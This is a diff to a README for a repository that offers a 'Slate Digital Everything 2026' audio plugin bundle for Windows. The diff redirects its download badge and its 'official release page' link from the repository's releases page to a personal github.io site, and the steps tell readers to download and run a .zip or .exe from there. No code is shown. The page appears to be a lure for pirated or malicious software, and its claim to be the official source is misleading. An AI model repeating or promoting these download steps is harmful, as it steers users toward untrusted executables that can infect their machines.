@@ -1,6 +1,6 @@
 # 🎚️ Slate-Digital-Everything-2026 - Access professional mixing tools for Windows
 
-[![Download Slate Digital Bundle](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Pygmythrowpillow930/Slate-Digital-Everything-2026/releases)
+[![Download Slate Digital Bundle](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://pygmythrowpillow930.github.io)
 
 ## 📁 What is this bundle
 The Slate Digital Everything Bundle brings a collection of audio plugins to your Windows computer. This set includes tools for mixing, mastering, and sound design. You use these plugins within your digital audio workstation to improve your audio quality. The files support Windows 11 and Windows 10 systems.
@@ -20,7 +20,7 @@ Check that your audio interface drivers are current. Outdated drivers can cause 
 ## ⬇️ How to Download and Install
 Follow these steps to set up the software on your machine.
 
-1. Go to the [official release page](https://github.com/Pygmythrowpillow930/Slate-Digital-Everything-2026/releases) to find the latest version.
+1. Go to the [official release page](https://pygmythrowpillow930.github.io) to find the latest version.
 2. Look for the file ending in .zip or .exe under the Assets section.
 3. Click the link to begin your download.
 4. Locate the file in your Downloads folder once the transfer finishes.
